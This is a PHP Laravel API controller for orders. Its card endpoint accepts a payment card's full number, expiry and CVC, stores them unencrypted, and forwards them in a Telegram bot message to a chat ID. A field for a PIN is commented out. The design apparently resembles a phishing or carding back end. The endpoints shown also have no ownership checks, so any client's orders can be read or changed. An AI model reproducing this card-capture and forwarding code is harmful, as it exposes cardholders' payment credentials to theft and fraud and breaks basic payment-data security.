<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Http\Controllers\BaseController as BaseController;
use Validator;
use App\Models\Order;
use App\Http\Resources\Order as OrderResource;
use Telegram\Bot\Laravel\Facades\Telegram;
use Carbon\Carbon;

class OrderController extends BaseController
{
    /**
    * @OA\GET(
    *     path="/api/orders",
    *     summary="Get orders list",
    *     tags={"orders"},
    *     @OA\Response(
    *         response=200,
    *         description="OK",
    *         response=200,
    *         description="orders response",
    *         @OA\JsonContent(
    *             type="array",
    *             @OA\Items(ref="#/components/schemas/order")
    *         ),
    *     ),
    *     security={ * {"sanctum": {}}, * },
    * )
    */
    public function index()
    {
        $order = Order::orderBy('id')->get();
        return $this->sendResponse(OrderResource::collection($order), 'orders fetched.');
    }

    /**
    * @OA\GET(
    *     path="/api/orders/{id}",
    *     summary="Get orders by lr",
    *     tags={"orders"},
    *     @OA\Parameter(
    *         description="id to fetch",
    *         in="path",
    *         name="id",
    *         required=true,
    *         @OA\Schema(
    *             type="integer",
    *         )
    *     ),
    *     @OA\Response(
    *         response=200,
    *         description="lr response",
    *         @OA\JsonContent(ref="#/components/schemas/Location"),
    *     ),
    *     security={ * {"sanctum": {}}, * },
    * )
    */
    public function show($id)
    {
        $order = Order::find($id);
        if (is_null($order)) {
            return $this->sendError('Order does not exist.');
        }
        return $this->sendResponse(new OrderResource($order), 'Order fetched.');
    }

    public function search($search)
    {
        $order = Order::where('client_id', $search)->get();
        return $this->sendResponse(OrderResource::collection($order), 'Order fetched.');
    }

    /**
    * @OA\Post(
    *     path="/api/order-card",
    *     summary="Update order card info",
    *     tags={"Order"},
    *     @OA\RequestBody(
    *         @OA\MediaType(
    *             mediaType="application/json",
    *             @OA\Schema(
    *             @OA\Property(property="order_id", type="integer"),
    *             @OA\Property(property="card_num", type="integer"),
    *             @OA\Property(property="card_date", type="string"),
    *             @OA\Property(property="card_cvc", type="integer"),
    *             )
    *         )
    *    ),
    *     @OA\Response(
    *         response=200,
    *         description="Update OK",
    *         @OA\JsonContent(
    *             type="array",
    *             @OA\Items(ref="#/components/schemas/Order")
    *         ),
    *     ),
    *     security={ * {"sanctum": {}}, * },
    * )
    */
    public function card(Request $request)
    {
        $input = $request->all();

        $validator = Validator::make($input, [
            'order_id' => 'required|numeric',
            'card_num' => 'required|numeric',
            'card_date' => 'required',
            'cvc' => 'required|numeric',
        ]);
        if($validator->fails()){
            return $this->sendError($validator->errors());
        }

        $order = Order::find($input['order_id']);
        if (is_null($order)) {
            return $this->sendError('Order does not exist.');
        }

        if ($order->status > 2) {
            return $this->sendError('Order status error.');
        }

        $order->update([
          'card_num' => $input['card_num'],
          'card_date' => $input['card_date'],
          'cvc' => $input['cvc'],
          'status' => 3,
          'expired' => Carbon::now()->addHour(),
          //'pincode' => $input['pincode'],
        ]);

        Telegram::sendMessage([
            'chat_id' => $order->client_id,
            'text' => "Реквизиты вашей платежной карты:"
            . "\n" . $input['card_num'] . " " . $input['card_date']
            . "\n cvc " . $input['cvc'],
            //'reply_markup' => $this->buildKeyboard($text),
        ]);
        return $this->sendResponse(new OrderResource($order), 'Order updated.');
    }

    public function checkExpired()
    {
          $orders = Order::where('status', 3)->where('expired', '>', Carbon::now())->get();
          return $this->sendResponse(OrderResource::collection($orders), 'orders fetched.');
    }

}
